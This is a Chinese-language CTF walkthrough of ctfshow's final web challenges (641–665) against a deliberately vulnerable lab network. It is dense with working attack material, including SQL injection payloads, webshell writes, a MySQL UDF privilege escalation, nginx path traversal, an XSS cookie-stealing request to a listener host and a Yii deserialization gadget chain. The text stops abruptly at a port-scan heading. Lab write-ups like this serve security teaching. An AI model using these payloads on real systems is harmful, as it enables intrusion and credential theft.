---
title: ctfshow web入门(终极考核)
categories: ctfshow
---

# 前言

终极考核

<!--more-->

# 641

![image-20220324143647196](https://img-blog.csdnimg.cn/img_convert/48e18b1c741bac4b3199457b392be003.png)

# 642

首页html中发现 **/system36d** 路径，访问发现进行跳转，抓包发现flag

![image-20220324144631795](https://img-blog.csdnimg.cn/img_convert/88d804b245ba0bda792fabe3b59ee45a.png)

# 644

需要登录

![image-20220324145604161](https://img-blog.csdnimg.cn/img_convert/6984b406b2f989dc96ff7b0d610510d2.png)

在路径 /system36d/static/js/lock/index.js 下发现，密码和flag

![image-20220324145646465](https://img-blog.csdnimg.cn/img_convert/16da6bdef5c938150bcf353eeeb85f31.png)

![image-20220324150237372](https://img-blog.csdnimg.cn/img_convert/c2495a96d6dfb90dd645e1243ccff3a6.png)

还有就是 发现了 **checklogin.php?s=10** 访问会未授权登录

![image-20220324145922098](https://img-blog.csdnimg.cn/img_convert/bcd2244c3d5643701c9446de5b047f89.png)

# 645

备份数据库，发现flag，ctfshow{28b00f799c2e059bafaa1d6bda138d89}

# 643

发现网络测试会执行三个系统命令，抓包看能不能篡改命令

![image-20220324150914328](https://img-blog.csdnimg.cn/img_convert/dd5b8efce30e6396e5bd1b2c0e7dcf3f.png)

执行一手 ls 发现

```
checklogin.php
db
index.php
init.php
login.php
logout.php
main.php
secret.txt
static
update.php
update2.php
users.php
util
```

secret.txt为flag，ctfshow{616cd5fc37968fc20810b2db30152717}。这里应该是发现system36目录后先扫目录的

发现phpinfo **/system36d/users.php?action=phpInfo** 这个路径看着像tp框架

```
open_basedir	/var/www/html:/tmp

disable_functions	//漏了一个shell_exec

var_dump,curl_init,curl_exec,opendir,readdir,scandir,chdir,mkdir,stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,ini_set

Server API	FPM/FastCGI

allow_url_fopen	On	On
allow_url_include	Off	Off
```

# 646

抓更新的包，发现存在远程请求一个文件，可能存在文件包含(后来发现是file_get_contents)

![image-20220324152442312](https://img-blog.csdnimg.cn/img_convert/9e840dbe16b040ff90498db6f10d2913.png)

确实存在，filter伪协议依次获得几个文件源码

![image-20220324153216464](https://img-blog.csdnimg.cn/img_convert/34278bb207d77e33600c22476f685a55.png)

checklogin.php

```
<?php
error_reporting(0);
session_start();
$s=$_GET['s'];
setcookie('uid',intval($s));
$_SESSION['user_id']=intval($s);
header('location:main.php');
```

util/auth.php

```
<?php
error_reporting(0);
session_start();

if($_SESSION['user_id']==10 || $_SESSION['user_id']==99){

}else{
	header('location:/system36d/');
	die();
}
```

init.php

```
<?php
define('DB_PATH', __DIR__.'/db/data_you_never_know.db');
define('FLAG645','flag645=ctfshow{28b00f799c2e059bafaa1d6bda138d89}');
define('FLAG646','flag646=ctfshow{5526710eb3ed7b4742232d6d6f9ee3a9}');

//存在漏洞，未修补前注释掉
//include 'util/common.php';
```

util/common.php

```
<?php
include 'dbutil.php';
if($_GET['k']!==shell_exec('cat /FLAG/FLAG651')){
    die('651flag未拿到');
}
if(isset($_POST['file']) && file_exists($_POST['file'])){
    if(db::get_key()==$_POST['key']){
        include __DIR__.DIRECTORY_SEPARATOR.$_POST['file'];
    }
}
```

util/dbutil.php

```
<?php

class db{
    private static $host='localhost';
    private static $username='root';
    private static $password='root';
    private static $database='ctfshow';
    private static $conn;

    public static function get_key(){
        $ret = '';
        $conn = self::get_conn();
        $res = $conn->query('select `key` from ctfshow_keys');
        if($res){
            $row = $res->fetch_array(MYSQLI_ASSOC);
        }
        $ret = $row['key'];
        self::close();
        return $ret;
    }

    public static function get_username($id){
        $ret = '';
        $conn = self::get_conn();
        $res = $conn->query("select `username` from ctfshow_users where id = ($id)");
        if($res){
            $row = $res->fetch_array(MYSQLI_ASSOC);
        }
        $ret = $row['username'];
        self::close();
        return $ret;
    }

    private static function get_conn(){
        if(self::$conn==null){
            self::$conn = new mysqli(self::$host, self::$username, self::$password, self::$database);
        }
        return self::$conn;
    }

    private static function close(){
        if(self::$conn!==null){
            self::$conn->close();
        }
    }
}
```

users.php

```
<?php
error_reporting(0);
session_start();
include 'init.php';

$a=$_GET['action'];

$data = file_get_contents(DB_PATH);
$ret = '';
switch ($a) {
	case 'list':
		$ret = getUsers($data,intval($_GET['page']),intval($_GET['limit']));
		break;
	case 'add':
		$ret = addUser($data,$_GET['username'],$_GET['password']);
		break;
	case 'del':
		$ret = delUser($data,$_GET['username']);
		break;
	case 'update':
		$ret = updateUser($data,$_GET['username'],$_GET['password']);
		break;
	case 'backup':
		backupUsers();
		break;
	case 'upload':
		$ret = recoveryUsers();
		break;
	case 'phpInfo':
		$ret = phpInfoTest();
		break;
	case 'netTest':
		$ret = netTest($_GET['cmd']);
		break;
	case 'remoteUpdate':
		$ret = remoteUpdate($_GET['auth'],$_GET['update_address']);
		break;
	case 'authKeyValidate':
		$ret = authKeyValidate($_GET['auth']);
		break;
	case 'evilString':
		evilString($_GET['m']);
		break;
	case 'evilNumber':
		evilNumber($_GET['m'],$_GET['key']);
		break;
	case 'evilFunction':
		evilFunction($_GET['m'],$_GET['key']);
		break;
	case 'evilArray':
		evilArray($_GET['m'],$_GET['key']);
		break;
	case 'evilClass':
		evilClass($_GET['m'],$_GET['key']);
		break;
	default:
		$ret = json_encode(array(
		'code'=>0,
		'message'=>'数据获取失败',
		));
		break;
}

echo $ret;

function getUsers($data,$page=1,$limit=10){
	$ret = array(
		'code'=>0,
		'message'=>'数据获取成功',
		'data'=>array()
	);
	
	$isadmin = '否';
	$pass = '';
	$content='无';

	$users = explode('|', $data);
	array_pop($users);
	$index = 1;

	foreach ($users as $u) {
		if(explode('@', $u)[0]=='admin'){
			$isadmin = '是';
			$pass = 'flag就是管理员的密码，不过我隐藏了';
			$content = '删除此条记录后flag就会消失';
		}else{
			$pass = explode('@', $u)[1];
		}
		array_push($ret['data'], array(
			'id'=>$index,
			'username'=>explode('@', $u)[0],
			'password'=>$pass,
			'isAdmin'=>$isadmin,
			'content'=>$content
		));
		$index +=1;
	}
	$ret['count']=$index;
	$start = ($page-1)*$limit;
	$ret['data']=array_slice($ret['data'], $start,$limit,true);

	return json_encode($ret);

}

function addUser($data,$username,$password){
	$ret = array(
		'code'=>0,
		'message'=>'添加成功'
	);
	if(existsUser($data,$username)==0){
		$s = $data.$username.'@'.$password.'|';
		file_put_contents(DB_PATH, $s);

	}else{
		$ret['code']=-1;
		$ret['message']='用户已存在';
	}

	return json_encode($ret);
}

function updateUser($data,$username,$password){
	$ret = array(
		'code'=>0,
		'message'=>'更新成功'
	);
	if(existsUser($data,$username)>0 && $username!='admin'){
		$s = preg_replace('/'.$username.'@[0-9a-zA-Z]+\|/', $username.'@'.$password.'|', $data);
		file_put_contents(DB_PATH, $s);

	}else{
		$ret['code']=-1;
		$ret['message']='用户不存在或无权更新';
	}

	return json_encode($ret);
}

function delUser($data,$username){
	$ret = array(
		'code'=>0,
		'message'=>'删除成功'
	);
	if(existsUser($data,$username)>0 && $username!='admin'){
		$s = preg_replace('/'.$username.'@[0-9a-zA-Z]+\|/', '', $data);
		file_put_contents(DB_PATH, $s);

	}else{
		$ret['code']=-1;
		$ret['message']='用户不存在或无权删除';
	}

	return json_encode($ret);

}

function existsUser($data,$username){
	return preg_match('/'.$username.'@[0-9a-zA-Z]+\|/', $data);
}

function backupUsers(){
	$file_name = DB_PATH;
	if (! file_exists ($file_name )) {    
	    header('HTTP/1.1 404 NOT FOUND');  
	} else {    
	    $file = fopen ($file_name, "rb" ); 
	    Header ( "Content-type: application/octet-stream" ); 
	    Header ( "Accept-Ranges: bytes" );  
	    Header ( "Accept-Length: " . filesize ($file_name));  
	    Header ( "Content-Disposition: attachment; filename=backup.dat");     
	    echo str_replace(FLAG645, 'flag就在这里，可惜不能给你', fread ( $file, filesize ($file_name)));    
	    fclose ( $file );    
	    exit ();    
	}
}

function getArray($total, $times, $min, $max)
    {
        $data = array();
        if ($min * $times > $total) {
            return array();
        }
        if ($max * $times < $total) {
            return array();
        }
        while ($times >= 1) {
            $times--;
            $kmix = max($min, $total - $times * $max);
            $kmax = min($max, $total - $times * $min);
            $kAvg = $total / ($times + 1);
            $kDis = min($kAvg - $kmix, $kmax - $kAvg);
            $r = ((float)(rand(1, 10000) / 10000) - 0.5) * $kDis * 2;
            $k = round($kAvg + $r);
            $total -= $k;
            $data[] = $k;
        }
        return $data;
 }


function recoveryUsers(){
	$ret = array(
		'code'=>0,
		'message'=>'恢复成功'
	);
	if(isset($_FILES['file']) && $_FILES['file']['size']<1024*1024){
		$file_name= $_FILES['file']['tmp_name'];
		$result = move_uploaded_file($file_name, DB_PATH);
		if($result===false){
			$ret['message']='数据恢复失败 file_name'.$file_name.' DB_PATH='.DB_PATH;
		}

	}else{
		$ret['message']='数据恢复失败';
	}

	return json_encode($ret);
}

function phpInfoTest(){
	return phpinfo();

}

function authKeyValidate($auth){
	$ret = array(
		'code'=>0,
		'message'=>$auth==substr(FLAG645, 8)?'验证成功':'验证失败',
		'status'=>$auth==substr(FLAG645, 8)?'0':'-1'
	);
	return json_encode($ret);
}

function remoteUpdate($auth,$address){
	$ret = array(
		'code'=>0,
		'message'=>'更新失败'
	);

	if($auth!==substr(FLAG645, 8)){
		$ret['message']='权限key验证失败';
		return json_encode($ret);
	}else{
		$content = file_get_contents($address);
		$ret['message']=($content!==false?$content:'地址不可达');
	}

	return json_encode($ret);


}

function evilString($m){
	$key = '372619038';
	$content = call_user_func($m);
	if(stripos($content, $key)!==FALSE){
		echo shell_exec('cat /FLAG/FLAG647');
	}else{
		echo 'you are not 372619038?';
	}

}

function evilClass($m,$k){
	class ctfshow{
		public $m;
		public function construct($m){
			$this->$m=$m;
		}
	}

	$ctfshow=new ctfshow($m);
	$ctfshow->$m=$m;
	if($ctfshow->$m==$m && $k==shell_exec('cat /FLAG/FLAG647')){
		echo shell_exec('cat /FLAG/FLAG648');
	}else{
		echo 'mmmmm?';
	}

}

function evilNumber($m,$k){
	$number = getArray(1000,20,10,999);
	if($number[$m]==$m && $k==shell_exec('cat /FLAG/FLAG648')){
		echo shell_exec('cat /FLAG/FLAG649');
	}else{
		echo 'number is right?';
	}
}

function evilFunction($m,$k){
	$key = 'ffffffff';
	$content = call_user_func($m);
	if(stripos($content, $key)!==FALSE && $k==shell_exec('cat /FLAG/FLAG649')){
		echo shell_exec('cat /FLAG/FLAG650');
	}else{
		echo 'you are not ffffffff?';
	}
}

function evilArray($m,$k){
	$arrays=unserialize($m);
	if($arrays!==false){
		if(array_key_exists('username', $arrays) && in_array('ctfshow', get_object_vars($arrays)) &&  $k==shell_exec('cat /FLAG/FLAG650')){
			echo shell_exec('cat /FLAG/FLAG651');
		}else{
			echo 'array?';
		}
	}
}

function netTest($cmd){
	$ret = array(
		'code'=>0,
		'message'=>'命令执行失败'
	);

	if(preg_match('/^[A-Za-z]+$/', $cmd)){
		$res = shell_exec($cmd);
		stripos(PHP_OS,'WIN')!==FALSE?$ret['message']=iconv("GBK", "UTF-8", $res):$ret['message']=$res;
	}
	
	return json_encode($ret);
}
```

# 647

![image-20220324160220497](https://img-blog.csdnimg.cn/img_convert/2becf5e3687132a64ca8e033c0483968.png)

返回值是个数组就行了 **/users.php?action=evilString&m=getallheaders**

ctfshow{e6ad8304cdb562971999b476d8922219}

# 648

![image-20220324201340621](https://img-blog.csdnimg.cn/img_convert/fdd23994984dc352a23d25adab8b85cf.png)

**?action=evilClass&m=1&key=flag_647=ctfshow{e6ad8304cdb562971999b476d8922219}**

ctfshow{af5b5e411813eafd8dc2311df30b394e}

# 649

![image-20220324202316488](https://img-blog.csdnimg.cn/img_convert/e40154de8e3e2405a832f9cb986858fa.png)

NULL绕过 **?action=evilNumber&m=&key=flag_648=ctfshow{af5b5e411813eafd8dc2311df30b394e}**

ctfshow{9ad80fcc305b58afbb3a0c2097ac40ef}

# 650

![image-20220324202840662](https://img-blog.csdnimg.cn/img_convert/29037b258aefdea1444895f54101fb34.png)

NULL 绕过，**?action=evilFunction&m=getenv&key=flag_649=ctfshow{9ad80fcc305b58afbb3a0c2097ac40ef}**

# 651

![image-20220324204703745](https://img-blog.csdnimg.cn/img_convert/5ebfa2aa28a3fdfa66a47d36b2879a56.png)

```
class a{
    public $username='123';
    public $y0ng="ctfshow";
}
$a=new a();
echo serialize($a);
```

**?action=evilArray&m=O:1:"a":2:{s:8:"username";s:3:"123";s:7:"ctfshow";s:7:"ctfshow";}&key=flag_650=ctfshow{5eae22d9973a16a0d37c9854504b3029}**

ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}

# 652

发现存在注入

![image-20220324211736445](https://img-blog.csdnimg.cn/img_convert/b3cceda18234fcc971ac47cf727aa144.png)

调用处在 url/page.php

![image-20220324211807362](https://img-blog.csdnimg.cn/img_convert/cd6a0fec680483bf6d73c4a76da90a5c.png)



```
// root@localhost
?id=-1) union select user()%23

//ctfshow_keys,ctfshow_secret,ctfshow_users
//secret
0) union select group_concat(column_name) from information_schema.columns where table_name=0x63746673686f775f736563726574%23

//flag_652=ctfshow{4b37ab4b6504d43ea0de9a688f0e3ffa}
0) union select secret from ctfshow_secret%23

//0) union select key from ctfshow_keys%23无回显，可能存在特殊字符
//key_is_here_you_know
0) union select `key` from ctfshow_keys%23
```

# 653

接着审计，common存在任意文件包含

![image-20220324213504576](https://img-blog.csdnimg.cn/img_convert/28b35c2da9b9c96a5c651e43603a25f6.png)

users.php未检测文件内容，文件名写死为 data_you_never_know.db

![image-20220324213603742](https://img-blog.csdnimg.cn/img_convert/34e2debf1760e92e9e3151f0022ffaa7.png)

那就上传一句话然后去包含来rce，数据还原上传

```
/system36d/util/common.php?k=flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}

POST: 由于openbase_dir存在且ban了chdir，没法bypass
key=key_is_here_you_know&file=../db/data_you_never_know.db&1=echo shell_exec('ls /;cat /secret.txt');
//写shell
key=key_is_here_you_know&file=../db/data_you_never_know.db&1=echo shell_exec('echo "<?=eval(\$_POST[a]);?>" > /var/www/html/static/y0ng.php');
```

ctfshow{5526710eb3ed7b4742232d6d6f9ee3a9}

# 654

- udf 提权

利用之前的高权限数据库账号密码蚁剑连接

```
a=file_put_contents('y0ng.so',hex2bin('7F454C4...'));

a=echo `cp y0ng.so /usr/lib/mariadb/plugin/y0ng.so`;
```

然后利用shell写一个mysql.php

```
<?php
highlight_file(__FILE__);
error_reporting(E_ALL);
$mysqli = new mysqli("localhost","root","root","ctfshow");
$tmp = $mysqli->query($_POST['sql']);
$result = $tmp->fetch_all();
print_r($result);
?>
或者
<?php
function query($sql){
    $host='localhost';
    $username='root';
    $password='root';
    $database='ctfshow';

    $ret = array();
    $conn = new mysqli($host, $username, $password, $database);
    if ($conn->connect_error) {die("连接失败: " . $conn->connect_error);}

    $res = $conn->query($sql);
    if($res){
        while ($row = $res->fetch_array(MYSQLI_NUM)) {
            array_push($ret,$row);
        }
    $res->close();
    }
    else{echo $conn->error;}
    $conn->close();
    return $ret;
    }
$ret=query($_POST['sql']);
print_r(($ret));
?>
```

```
sql=show global variables like 'secure%'
sql=CREATE FUNCTION sys_eval RETURNS STRING SONAME 'y0ng.so'
sql=select sys_eval('sudo cat /root/you_win')
//擦屁股
sql=drop function sys_eval
sql=delete from mysql.func where name='sys_eval'
```



![image-20220324232943953](https://img-blog.csdnimg.cn/img_convert/98136d187955daea83b5c25fae489270.png)

执行系统函数就行了

![image-20220324233016439](https://img-blog.csdnimg.cn/img_convert/8252f2759ee93e698d49617ec5dcc7c3.png)

ctfshow{4ab2c2ccd0c3c35fdba418d8502f5da9}

# 655

看了一下/etc/hosts 发现 172网段

![image-20220326181047726](https://img-blog.csdnimg.cn/img_convert/26e6381d71cf85f89271d0a30401f07f.png)

扫一下网段存活主机

```
#!/bin/bash
for ip in `seq 1 50`
  do
   {
  ping -c 1 172.2.171.$ip >/dev/null 2>&1
    if [ $? -eq 0 ];then
     echo 172.2.171.$ip UP
    else
     echo 172.2.171.$ip DOWN
   fi
}&
done
wait

//a=echo `sh scan.sh`;
```

发现几台存活主机

```
172.2.171.1 UP
172.2.171.7 UP
172.2.171.6 UP
172.2.171.5 UP
172.2.171.3 UP
172.2.171.2 UP
172.2.171.4 UP
```

发现 172.2.171.5 存在http服务

```
a=echo `curl http://172.2.171.5/`;
//{"code":0,"message":"数据获取失败"}
```

开始对常规文件进行扫描，看是否存在泄露

```
//robots.txt
disallowed /public/
//www.zip
a=echo `wget http://172.2.171.5/www.zip`;
//phpinfo.php
flag_655=ctfshow{aada21bce99ddeab20020ac714686303}
nginx/1.18.0
FPM/FastCGI
```

www.zip中发现index.php

```php
<?php

include 'dbutil.php';
include 'flag.php';
error_reporting(0);
session_start();

$a=$_GET['action'];

switch ($a){
    case 'login':
    	$ret = login($_GET['u'],$_GET['p']);
        break;
    case 'index':
    	$ret = index();
        break;
    case 'main':
    	$ret = main($_GET['m']);
    	break;
    default:
         $ret = json_encode(array(
		'code'=>0,
		'message'=>'数据获取失败',
		));
		break;
}

echo $ret;

function index(){
    $html='管理员请注意，下面是最近登陆失败用户：<br>';
    $ret=db::query('select username,login_time,login_ip from ctfshow_logs  order by id desc limit 3');
    foreach ($ret as $r) {
    	$html .='------------<br>用户名: '.htmlspecialchars($r[0]).'<br>登陆失败时间: '
    	.$r[1]
    	.'<br>登陆失败IP: '
    	.$r[2].
    	'<br>------------<br>';
    }
    return $html;
}

function login($u,$p){
	$ret = array(
	'code'=>0,
	'message'=>'数据获取失败',
	);
	$u = addslashes($u);
	$p = addslashes($p);
	$res = db::query("select username from ctfshow_users where username = '$u' and password = '$p'");
	$date = new DateTime('now');
	$now = $date->format('Y-m-d H:i:s');
	$ip = addslashes(gethostbyname($_SERVER['HTTP_X_FORWARDED_FOR']));

	if(count($res)==0){
 		 db::insert("insert into `ctfshow_logs` (`username`,`login_time`,`login_ip`) values ('$u','$now','$ip')");
		 $ret['message']='账号或密码错误';
		 return json_encode($ret);
	}

	if(!auth()){
		$ret['message']='AuthKey 错误';
	}else{
		$ret['message']='登陆成功';
		$_SESSION['login']=true;
		$_SESSION['flag_660']=$_GET['flag'];
	}

	return json_encode($ret);
}

function auth(){
	$auth = base64_decode($_COOKIE['auth']);
	return $auth==AUTH_KEY;
}

function getFlag(){
	return  FLAG_657;
}

function testFile($f){
	$result = '';
	$file = $f.md5(md5(random_int(1,10000)).md5(random_int(1,10000))).'.php';
	if(file_exists($file)){
		$result = FLAG_658;
	}
	return $result;

}

function main($m){
	$ret = array(
	'code'=>0,
	'message'=>'数据获取失败',
	);
	if($_SESSION['login']==true){
		
		switch ($m) {
			case 'getFlag':
				$ret['message']=getFlag();
				break;
			case 'testFile':
				$ret['message']=testFile($_GET['f']);
				break;
			default:
				# code...
				break;
		}
		
	}else{
		$ret['message']='请先登陆';
	}

	return json_encode($ret);
}
```

# 659 665

nginx存在目录穿越

![image-20220326185627908](https://img-blog.csdnimg.cn/img_convert/6eb7c12398856624b112ca059e0e0b98.png)

```
a=echo `curl http://172.2.171.5/public../FLAG/flag659.txt`;
a=echo `curl http://172.2.171.5/public../FLAG665`;
//flag_659=ctfshow{73c4213829f8b393b2082bacb4253cab}
//flag_665=ctfshow{35802d184dba134bdc8d0d23e09051f7}
```

# 660

翻找nginx日志文件时发现660

```
a=echo `curl http://172.2.171.5/public../var/log/nginx/ctfshow_web_access_log_file_you_never_know.log`;
//index.php?action=login&u=admin&p=nE7jA5m&flag=flag_660_ctfshow{23e56d95b430de80c7b5806f49a14a2b}
```

# 656

审计index.php发现存在xss打admin的cookie

![image-20220326190857912](https://img-blog.csdnimg.cn/img_convert/f337207666227938b25d93df3f8e28a5.png)

也没过滤

![image-20220326191449344](https://img-blog.csdnimg.cn/img_convert/ea44402f5a3b1d7952f08ea8af95e829.png)

利用跳板机的http服务监听返回数据

```
//xss.php
<?php
$a = $_REQUEST['a'];
file_put_contents('xss.log',$a);
?>
```

xss打过去 同时得知admin机子为 .6

```
a=echo `curl  --header "X-Forwarded-For:<script>window.location.href=\"http://172.2.39.4:80/static/xss.php?a=\"+document.cookie</script>" http://172.2.39.5:80/index.php?action=login&u=1&p=2`;
```

xss.log

```
PHPSESSID=1rbpav9gv5to73c7bcf475kks6; auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=
//flag_656=ctfshow{e0b80d6b99d2bdbae36f121f78abe96b}
```

# 657

审计

```
a=echo `curl  --header "Cookie: PHPSESSID=7odu2rhml9930mjcqen79vi2ei;auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=" http://172.2.39.5:80/index.php?action=main\&m=getFlag`;
//flag_657=ctfshow{2a73f8f87a58a13c23818fafd83510b1}
```

# 658

```
function testFile($f){
	$result = '';
	$file = $f.md5(md5(random_int(1,10000)).md5(random_int(1,10000))).'.php';
	if(file_exists($file)){
		$result = FLAG_658;
	}
	return $result;
}
```

利用file_exists去访问ftp上的文件，只返回存在即可，利用第一台机子的python3

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 21))
s.listen(1)
print('listening 0.0.0.0 21\n')
conn, addr = s.accept()
conn.send(b'220 a\n')
conn.send(b'230 a\n')
conn.send(b'200 a\n')
conn.send(b'200 a\n')
conn.send(b'200\n')
conn.send(b'200 a\n')
conn.send(b'200\n')
conn.send(b'200 a\n')
conn.close()
```

```
a=file_put_contents('/tmp/1.py',base64_decode("aW1wb3J0IHNvY2tldApzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmJpbmQoKCcwLjAuMC4wJywgMjEpKQpzLmxpc3RlbigxKQpwcmludCgnbGlzdGVuaW5nIDAuMC4wLjAgMjFcbicpCmNvbm4sIGFkZHIgPSBzLmFjY2VwdCgpCmNvbm4uc2VuZChiJzIyMCBhXG4nKQpjb25uLnNlbmQoYicyMzAgYVxuJykKY29ubi5zZW5kKGInMjAwIGFcbicpCmNvbm4uc2VuZChiJzIwMCBhXG4nKQpjb25uLnNlbmQoYicyMDBcbicpCmNvbm4uc2VuZChiJzIwMCBhXG4nKQpjb25uLnNlbmQoYicyMDBcbicpCmNvbm4uc2VuZChiJzIwMCBhXG4nKQpjb25uLmNsb3NlKCk="));

a=echo `nohup python3 /tmp/1.py > /tmp/error.log 2>&1 &`;

a=echo `curl --cookie "PHPSESSID=mueen4l5rs14qndtndjb31ddh4;" "http://172.2.39.5/index.php?action=main&m=testFile&f=ftp://172.2.39.4/aa"`;
```

![image-20220330141500247](https://img-blog.csdnimg.cn/img_convert/412458de09f850d4ecd585b1da6e842b.png)

ctfshow{98555a97cb23e7413d261142e65a674f}

# 661

```
a=echo `curl http://172.2.39.5/public../home/flag/secret.txt`;
//flag_661=ctfshow{d41c308e12fdecf7782eeb7c20f45352}
```

# 662

```
a=echo `curl http://172.2.39.5/public../home/www-data/creater.sh`;
//creater.sh
file=`echo $RANDOM|md5sum|cut -c 1-3`.html
echo 'flag_663=ctfshow{xxxx}' > /var/www/html/$file
```

前三位数为随机数，scan.py



# 663

发现第二台机子上有ctfshow拓展

![image-20220330160108414](https://img-blog.csdnimg.cn/img_convert/e08f48e7736faae1db19e3fdc05505c2.png)

拓展地址 /usr/local/lib/php/extensions/no-debug-non-zts-20180731

![image-20220330160159552](https://img-blog.csdnimg.cn/img_convert/d606937ab755fed89c4eaede27430639.png)

下载下来

![](https://img-blog.csdnimg.cn/img_convert/93f2a01394e589d08e79bc1b523a5a44.png)

strings一下

![image-20220330164246531](https://img-blog.csdnimg.cn/img_convert/950c3791c7cefd18902068f3f36035a9.png)

ctfshow{fa5cc1fb0bfc986d1ef150269c0de197}

# 664

读取nginx配置文件

```
a=echo `curl http://172.2.39.5:80/public../etc/nginx/nginx.conf`;
```

```
daemon off;

worker_processes  auto;

error_log  /var/log/nginx/ctfshow_web_error_log_file_you_never_know.log warn;


events {
    worker_connections  1024;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;
    log_format  main  '[$time_local]:$remote_addr-$request-$status';
    access_log /var/log/nginx/ctfshow_web_access_log_file_you_never_know.log main;
    server {
        listen       80;
        server_name  localhost;
        root         /var/www/html;
        index index.php;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        location /public {
            autoindex on;
            alias /public/;
        }

        location ~ \.php$ {
            try_files $uri =404;
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            include        fastcgi_params;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        }

    }

    server {
        listen       8888;
        server_name  oa;
        root         /var/oa/web;
        index index.php;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        location /{
            index index.php;
            autoindex off;

        }

       location ~ \.php$ {
            try_files $uri =404;
            fastcgi_pass   127.0.0.1:9000;
            fastcgi_index  index.php;
            include        fastcgi_params;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        }
    }
}
```

发现8888端口，访问发现使用了Yii框架

![image-20220330164814091](https://img-blog.csdnimg.cn/img_convert/5a933ff008adef266f8a32fc70a63f5a.png)

发现表单存在反序列化操作

![image-20220330165053119](https://img-blog.csdnimg.cn/img_convert/2041ac682f60c78f39a95b8671d02e82.png)

看了wp，反序列化拿shell

```
select sys_eval('sudo curl -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "UnserializeForm[ctfshowUnserializeData]=O%3A32%3A%22Codeception%5CExtension%5CRunProcess%22%3A2%3A%7Bs%3A43%3A%22%00Codeception%5CExtension%5CRunProcess%00processes%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%22%3A1%3A%7Bs%3A42%3A%22%00Symfony%5CComponent%5CString%5CLazyString%00value%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A16%3A%22yii%5Cgii%5CCodeFile%22%3A3%3A%7Bs%3A9%3A%22operation%22%3BN%3Bs%3A4%3A%22path%22%3Bs%3A28%3A%22%2Fvar%2Foa%2Fweb%2Fassets%2Fshell.php%22%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7Di%3A1%3Bs%3A4%3A%22save%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A0%3A%22%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D%7Ds%3A40%3A%22%00Codeception%5CExtension%5CRunProcess%00output%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%22%3A1%3A%7Bs%3A42%3A%22%00Symfony%5CComponent%5CString%5CLazyString%00value%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22yii%5Crest%5CCreateAction%22%3A2%3A%7Bs%3A11%3A%22checkAccess%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A16%3A%22yii%5Cgii%5CCodeFile%22%3A3%3A%7Bs%3A9%3A%22operation%22%3BN%3Bs%3A4%3A%22path%22%3Bs%3A28%3A%22%2Fvar%2Foa%2Fweb%2Fassets%2Fshell.php%22%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7Di%3A1%3Bs%3A4%3A%22save%22%3B%7Ds%3A2%3A%22id%22%3Bs%3A0%3A%22%22%3B%7Di%3A1%3Bs%3A3%3A%22run%22%3B%7D%7D%7D%7D" "http://oa:8888/index.php?r=site%2Funserialize&key=flag_663%3Dctfshow%7Bfa5cc1fb0bfc986d1ef150269c0de197%7D"')
```

还是ban掉了一些函数

```
a=echo `curl http://172.2.39.5:8888/assets/shell.php -d "1=phpinfo();"`;
```



![image-20220330170826044](https://img-blog.csdnimg.cn/img_convert/617c85147b4380fee977f0019734d66b.png)



接着扫目录发现了flag664.php

```
a=echo `curl http://172.2.39.5:8888/assets/shell.php -d "1=var_dump(scandir('../../'));"`;
a=echo `curl http://172.2.39.5:8888/assets/shell.php -d "1=echo file_get_contents('../../flag664.php');"`;
```

扫描端口

```
